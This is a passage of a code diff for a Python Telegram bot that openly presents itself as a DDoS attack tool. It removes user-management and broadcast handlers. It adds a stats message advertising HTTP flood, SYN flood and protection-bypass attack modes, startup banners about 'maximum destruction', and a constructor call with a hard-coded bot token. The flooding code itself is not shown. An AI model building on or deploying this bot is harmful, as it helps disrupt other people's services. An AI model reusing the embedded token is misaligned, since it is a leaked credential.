-        self.remove_user(chat_id)
-        await update.message.reply_text(f"✅ *User Removed*\n\nChat ID: `{chat_id}`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-    
-    async def list_users(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if update.effective_chat.id != ADMIN_CHAT_ID:
-            await update.message.reply_text("❌ *Admin Only Command*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        users = self.get_users()
-        if not users:
-            await update.message.reply_text("📝 *No Authorized Users*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        users_text = "🛡️ *AUTHORIZED USERS*\n\n"
-        for user in users:
-            chat_id, username, added_date = user
-            users_text += f"• Chat ID: `{chat_id}`\n"
-            if username and username != "Unknown":
-                users_text += f"  Username: @{username}\n"
-            users_text += f"  Added: {added_date[:10]}\n\n"
-        
-        users_text += f"_Developed by:_ @VAIBHAV_JAAT_OP"
-        await update.message.reply_text(users_text, parse_mode='Markdown')
-    
-    async def broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if update.effective_chat.id != ADMIN_CHAT_ID:
-            await update.message.reply_text("❌ *Admin Only Command*\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        if not context.args:
-            await update.message.reply_text("❌ Usage: `/broadcast <message>`\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-            return
-        
-        message = " ".join(context.args)
-        users = self.get_users()
-        sent_count = 0
-        
-        for user in users:
-            chat_id = user[0]
-            try:
-                await context.bot.send_message(
-                    chat_id=chat_id,
-                    text=f"📢 *BROADCAST*\n\n{message}\n\n_Developed by:_ @VAIBHAV_JAAT_OP",
-                    parse_mode='Markdown'
-                )
-                sent_count += 1
-            except:
-                continue
-        
-        await update.message.reply_text(f"✅ *Broadcast Sent*\n\nDelivered to: {sent_count} users\n_Developed by:_ @VAIBHAV_JAAT_OP", parse_mode='Markdown')
-    
-    def setup_handlers(self):
-        self.application.add_handler(CommandHandler("start", self.start))
-        self.application.add_handler(CommandHandler("help", self.help))
-        self.application.add_handler(CommandHandler("attack", self.attack))
-        self.application.add_handler(CommandHandler("add", self.add_user))
-        self.application.add_handler(CommandHandler("remove", self.remove_user))
-        self.application.add_handler(CommandHandler("users", self.list_users))
-        self.application.add_handler(CommandHandler("broadcast", self.broadcast))
+    async def show_stats(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        stats = f"""
+📊 *ULTIMATE BOT STATS*
+
+*Active Attacks:* {len(self.active_attacks)}
+*Max Power:* **ACTIVATED**
+*Status:* **READY FOR DESTRUCTION**
+
+*Features:*
+⚡ God Mode (All Attacks)
+💥 Nuclear HTTP Flood
+🌪️ SYN Apocalypse
+🔥 Multi-Vector Bypass
+
+*Developer/Owner:* @VAIBHAV_JAAT_OP
+"""
+        await update.message.reply_text(stats, parse_mode='Markdown')
     
     def run(self):
+        print("💀 ULTIMATE APEX PREDATOR DDOS BOT ACTIVATED")
+        print("🔥 GOD MODE: ALL ATTACK VECTORS ARMED")
+        print("⚡ MAXIMUM DESTRUCTION: ACHIEVED")
+        print("🌪️ BYPASS ALL PROTECTIONS: ENABLED")
         self.application.run_polling()
 
+# ULTIMATE DEPLOYMENT
 if __name__ == "__main__":
-    bot = DDoSBot()
+    bot = UltimateDDoSBot("7984133756:AAExRUlyH8Pyxm3YI143rbiAsAp8OTm3gng")
     bot.run()
